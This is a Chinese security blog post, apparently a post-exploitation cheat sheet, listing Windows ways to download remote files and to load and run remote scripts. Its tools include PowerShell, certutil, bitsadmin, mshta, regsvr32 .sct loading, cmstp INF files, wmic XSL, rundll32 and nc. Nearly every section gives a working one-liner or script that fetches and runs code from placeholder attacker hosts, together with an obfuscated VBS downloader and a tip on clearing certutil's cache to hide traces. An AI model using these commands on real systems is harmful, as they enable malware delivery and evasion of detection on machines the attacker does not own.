<h3 id="下载任意格式文件"><a href="#下载任意格式文件" class="headerlink" title="下载任意格式文件"></a>下载任意格式文件</h3><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><p><strong>方法一：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;xxx:6666&#x2F;1.txt&#39;,&#39;C:\Windows\Temp\2.txt&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200812213732096.png" alt="image-20200812213732096"></p>
<p><strong>方法二：</strong></p>
<pre><code>首先准备一个ps脚本，内容如下</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$Urls &#x3D; @()</span><br><span class="line">$Urls +&#x3D; &quot;http:&#x2F;&#x2F;xxx:6666&#x2F;foo.xsl&quot;</span><br><span class="line">$OutPath &#x3D; &quot;C:\Windows\Temp\&quot; </span><br><span class="line">ForEach ( $item in $Urls) &#123;</span><br><span class="line">$file &#x3D; $OutPath + ($item).split(&#39;&#x2F;&#39;)[-1]</span><br><span class="line">(New-Object System.Net.WebClient).DownloadFile($item, $file) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        使用下面命令执行下载文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -File down.ps1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200812214929736.png" alt="image-20200812214929736"></p>
<h4 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h4><p>​        用于备份证书服务，支持xp-win10都支持。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;xxx:6666&#x2F;1.txt c:\windows\temp\test.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200820104905690.png" alt="image-20200820104905690"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;ccc:6666&#x2F;1.txt delete  删除缓存</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200820105120705.png" alt="image-20200820105120705"></p>
<h4 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h4><p>​        bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;xxxx:6666&#x2F;1.txt C:\Windows\Temp\3.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200820105507751.png" alt="image-20200820105507751"></p>
<h4 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h4><p><strong>方法一：</strong></p>
<p>​        可以使用vbs脚本来执行文件下载操作,vbs内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set a&#x3D;createobject(&quot;adod&quot;+&quot;b.stream&quot;):set w&#x3D;createobject(&quot;micro&quot;+&quot;soft.xmlhttp&quot;):w.open&quot;get&quot;,wsh.arguments(0),0:w.send:a.type&#x3D;1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2</span><br></pre></td></tr></table></figure>

<p>​        再使用cscript加载该文件执行下载写入的功能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &#x2F;nologo downfile.vbs http:&#x2F;&#x2F;xxx:801&#x2F;1.txt c:\windows\temp\1.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821100115562.png" alt="image-20200821100115562"></p>
<p>​        甚至也可以使用cmd先写入vbs文件，最后再调用vbs执行下载功能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo set a&#x3D;createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w&#x3D;createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type&#x3D;1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt;downfile.vbs</span><br></pre></td></tr></table></figure>

<p><strong>方法二：</strong></p>
<p>​        还可以使用其他的下载vbs脚本文件执行下载功能，文件内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">strFileURL &#x3D; &quot;http:&#x2F;&#x2F;119.xxx.xxx.xxx&#x2F;1.txt&quot;</span><br><span class="line">strHDLocation &#x3D; &quot;1.txt&quot;</span><br><span class="line">Set objXMLHTTP &#x3D; CreateObject(&quot;MSXML2.XMLHTTP&quot;)</span><br><span class="line">objXMLHTTP.open &quot;GET&quot;, strFileURL, false</span><br><span class="line">objXMLHTTP.send()</span><br><span class="line">If objXMLHTTP.Status &#x3D; 200 Then</span><br><span class="line">Set objADOStream &#x3D; CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">objADOStream.Open</span><br><span class="line">objADOStream.Type &#x3D; 1</span><br><span class="line">objADOStream.Write objXMLHTTP.ResponseBody</span><br><span class="line">objADOStream.Position &#x3D; 0</span><br><span class="line">Set objFSO &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation</span><br><span class="line">Set objFSO &#x3D; Nothing</span><br><span class="line">objADOStream.SaveToFile strHDLocation</span><br><span class="line">objADOStream.Close</span><br><span class="line">Set objADOStream &#x3D; Nothing</span><br><span class="line">End if</span><br><span class="line">Set objXMLHTTP &#x3D; Nothing</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821104803291.png" alt="image-20200821104803291"></p>
<h4 id="js"><a href="#js" class="headerlink" title="js"></a>js</h4><p><strong>方法一：</strong></p>
<p>​        首先准备一个js文件，文件内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var objArgs &#x3D; WScript.Arguments;var sGet&#x3D;new ActiveXObject(&quot;ADODB.Stream&quot;);var xGet &#x3D; false;</span><br><span class="line">try &#123;</span><br><span class="line">xGet &#x3D; new XMLHttpRequest();</span><br><span class="line">&#125; </span><br><span class="line">catch (trymicrosoft) &#123;</span><br><span class="line">try &#123;</span><br><span class="line">    xGet &#x3D; new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);</span><br><span class="line">&#125; </span><br><span class="line">catch (othermicrosoft) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      xGet &#x3D; new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">    &#125; </span><br><span class="line">catch (failed) &#123;</span><br><span class="line">      xGet &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">xGet.Open (&quot;GET&quot;,objArgs(0).toLowerCase(),0);xGet.Send();sGet.Mode&#x3D;3;sGet.Type&#x3D;1;sGet.Open();sGet.Write (xGet.ResponseBody);sGet.SaveToFile (objArgs(1).toLowerCase(),2);</span><br></pre></td></tr></table></figure>

<p>​        通过cscript调用该文件执行下载操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &#x2F;nologo down.js http:&#x2F;&#x2F;xxx:801&#x2F;1.txt c:\windows\temp\test123123.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821105402895.png" alt="image-20200821105402895"></p>
<p><strong>方法二：</strong></p>
<p>​        准备一个js文件，文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), &#x2F;*async&#x3D;*&#x2F;false);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">BinStream &#x3D; new ActiveXObject(&quot;ADODB.Stream&quot;); BinStream.Type &#x3D; 1;</span><br><span class="line">BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);</span><br><span class="line">BinStream.SaveToFile(&quot;test12312223123.txt&quot;);</span><br></pre></td></tr></table></figure>

<p>​        执行如下命令进行下载文件操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &#x2F;nologo down2.js http:&#x2F;&#x2F;xxx:801&#x2F;1.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821110118839.png" alt="image-20200821110118839"></p>
<p><strong>注意</strong></p>
<p>​        方法二这种文件下载方式有一些缺点，首先不能指定绝对路径，否则会写入失败，另外，文件名也不能和系统在该目录下已有的文件名冲突，否则也会写入失败。</p>
<h4 id="certreq"><a href="#certreq" class="headerlink" title="certreq"></a>certreq</h4><p>​        在 Windows Server 2008 R2 上提供了 Microsoft certreq 实用程序，可使用该实用程序生成 CSR 和导入签名证书。下载命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CertReq -Post -config http:&#x2F;&#x2F;xxx:801&#x2F;1.txt c:\windows\win.ini c:\windows\temp\output.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821110958332.png" alt="image-20200821110958332"></p>
<p>​        这个程序虽然可以下载任意形式的文件，但是又有两个限制，第一个限制就是在serever 2008 r2以上的系统。第二个就是长度限制，不能下载超过60k的文件。这种文件下载的方式如果文件存在也会报错，因此使用这种方式下载文件，文件名不能和已有的文件名相同。</p>
<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;from urllib import urlretrieve; urlretrieve(&#39;http:&#x2F;&#x2F;xxx:801&#x2F;1.txt&#39;, &#39;C:\\Windows\\Temp\\test8866.txt&#39;)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821114745482.png" alt="image-20200821114745482"></p>
<h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><h3 id="下载指定格式文件"><a href="#下载指定格式文件" class="headerlink" title="下载指定格式文件"></a>下载指定格式文件</h3><h4 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h4><p>​        使用msiexec可以下载并执行msi文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;xxxx:8011&#x2F;test666.msi</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821134222982.png" alt="image-20200821134222982"></p>
<h4 id="mshta"><a href="#mshta" class="headerlink" title="mshta"></a>mshta</h4><p>​        mshta可以远程加载hta文件并执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:801&#x2F;download&#x2F;file.ext</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821134354798.png" alt="image-20200821134354798"></p>
<h4 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h4><p>​        使用regsvr32可以远程加载并执行sct文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;u &#x2F;s &#x2F;i:http:&#x2F;&#x2F;xxx:8011&#x2F;test8866.sct scrobj.dll</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821135750174.png" alt="image-20200821135750174"></p>
<h4 id="CMSTP"><a href="#CMSTP" class="headerlink" title="CMSTP"></a>CMSTP</h4><p>​    使用cmstp加载本地的inf文件，inf中再去加载远程的sct文件。</p>
<p>inf中的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[version]</span><br><span class="line">Signature&#x3D;$chicago$</span><br><span class="line">AdvancedINF&#x3D;2.5</span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">UnRegisterOCXs&#x3D;UnRegisterOCXSection</span><br><span class="line">[UnRegisterOCXSection]</span><br><span class="line">%11%\scrobj.dll,NI,http:&#x2F;&#x2F;10.0.0.2&#x2F;tmp&#x2F;powersct.sct</span><br><span class="line">[Strings]</span><br><span class="line">AppAct &#x3D; &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName&#x3D;&quot;Pentestlab&quot;</span><br><span class="line">ShortSvcName&#x3D;&quot;Pentestlab&quot;</span><br></pre></td></tr></table></figure>

<p>​        再使用如下命令加载inf文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmstp.exe &#x2F;s xxx.inf</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821140228440.png" alt="image-20200821140228440"></p>
<p>​        使用这种方式加载并执行远程的文件有个缺陷，就是会在执行的目录下生成一个快捷方式文件还有一个cmp文件。</p>
<h4 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h4><p>​        使用wmic可以加载并执行远程的xsl文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process get brief &#x2F;format:&quot;http:&#x2F;&#x2F;xxx:8080&#x2F;launcher.xsl&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821140727620.png" alt="image-20200821140727620"></p>
<h4 id="WCS"><a href="#WCS" class="headerlink" title="WCS"></a>WCS</h4><p>​        首先创建一个js文件，文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(&quot;script:http:&#x2F;&#x2F;xxxx:8011&#x2F;test.wsc&quot;);</span><br></pre></td></tr></table></figure>

<p>​        使用cscript执行js文件，加载并执行远程的wsc文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csript  1.js</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821141107404.png" alt="image-20200821141107404"></p>
<p>​        wsc文件中的内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;    </span><br><span class="line">&lt;package&gt;</span><br><span class="line">&lt;component id&#x3D;&quot;testCalc&quot;&gt;    </span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); </span><br><span class="line">]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;    </span><br><span class="line">&lt;&#x2F;component&gt;</span><br><span class="line">&lt;&#x2F;package&gt;</span><br></pre></td></tr></table></figure>

<h4 id="rundll32"><a href="#rundll32" class="headerlink" title="rundll32"></a>rundll32</h4><p>​        rundll32本身并不能达到加载并且运行远程文件的目的，不过可以配合其他方式来下载远程文件并执行</p>
<p>比如可以加载hta文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;C:&#x2F;Windows&#x2F;System32&#x2F;mshta.exe http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8011&#x2F;test.hta&quot;,0,true);self.close();</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821141739314.png" alt="image-20200821141739314"></p>
<h3 id="非自带程序"><a href="#非自带程序" class="headerlink" title="非自带程序"></a>非自带程序</h3><h4 id="msxsl"><a href="#msxsl" class="headerlink" title="msxsl"></a>msxsl</h4><p>​        msxsl.exe可以去加载远程的xsl文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msxsl.exe http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8011&#x2F;test.xsl  http:&#x2F;&#x2F;xx.xxx.xx.xx:8011&#x2F;test.xsl</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821142928346.png" alt="image-20200821142928346"></p>
<p>​        xsl文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot; xmlns:ms&#x3D;&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user&#x3D;&quot;placeholder&quot;</span><br><span class="line">version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">	&lt;ms:script implements-prefix&#x3D;&quot;user&quot; language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">	&lt;![CDATA[</span><br><span class="line">	var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);</span><br><span class="line">	]]&gt; &lt;&#x2F;ms:script&gt;</span><br><span class="line">&lt;&#x2F;stylesheet&gt;</span><br></pre></td></tr></table></figure>

<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><p>​        首先在自己的服务端执行如下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444 &lt; evil.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821145912928.png" alt="image-20200821145912928"></p>
<p>​        在客户端执行下面的命令进行文件下载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  xxxxx 4444 &gt;evil.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821150020632.png" alt="image-20200821150020632"></p>
<h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><p>​        有些主机上安装了curl，因此也可以使用curl进行文件下载操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;xxx:1234&#x2F;evil.exe -o test123123.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821150327583.png" alt="image-20200821150327583"></p>
<h4 id="chfs"><a href="#chfs" class="headerlink" title="chfs"></a>chfs</h4><p>​        这款工具可以在主机上开启一个web服务，我们可以通过这个web服务对主机上的文件进行增删改查，这个方式比较适合在内网去使用。</p>
<p>​        上传到目标主机，在某个目录下执行这个文件，即可将当前目录共享出去</p>
<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821155948134.png" alt="image-20200821155948134"></p>
<p>​        在web下访问，即可对目录下的文件进行操作。</p>
<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821160044054.png" alt="image-20200821160044054"></p>
<h3 id="SMB协议下载"><a href="#SMB协议下载" class="headerlink" title="SMB协议下载"></a>SMB协议下载</h3><h4 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Users\jerry\Desktop\test666.inf \\192.168.3.144\c$\windows\temp\</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821164751755.png" alt="image-20200821164751755"></p>
<h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><p>​        使用这种方式可以在本地加载远程的文件执行 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;k \\192.168.3.144\c$\windows\temp\calc.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821165453771.png" alt="image-20200821165453771"></p>
<h4 id="cscript"><a href="#cscript" class="headerlink" title="cscript"></a>cscript</h4><p>​        使用这种方式可以加载远程的js并且执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript  \\192.168.3.144\c$\windows\temp\test.js</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821170207437.png" alt="image-20200821170207437"></p>
<h4 id="Odbcconf"><a href="#Odbcconf" class="headerlink" title="Odbcconf"></a>Odbcconf</h4><p>​        使用这种方式可以加载远程的dll进行执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">odbcconf.exe &#x2F;a &#123;regsvr \\192.168.3.144\c$\windows\temp\test.dll&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821172655915.png" alt="image-20200821172655915"></p>
<p>​        需要注意编译的dll的版本要和windows的版本相对应。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        关于windows下文件下载的方式先总结这么多，这些文件下载方式的种类虽然非常多，还是要选择适合自己当前环境的方式来选择对应的方法利用。</p>
<p><strong>参考文章</strong></p>
<p><a href="https://evi1cg.me/archives/remote_exec.html" target="_blank" rel="noopener">windows命令执行漏洞不会玩？ 看我！</a></p>
<p><a href="https://payloads.online/archivers/2017-11-08/1#0x02-ipc" target="_blank" rel="noopener">Windows下命令行下载文件总结</a></p>
<p><a href="https://xz.aliyun.com/t/7937#toc-3" target="_blank" rel="noopener">windows/Linux文件下载方式汇总</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

  </div>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
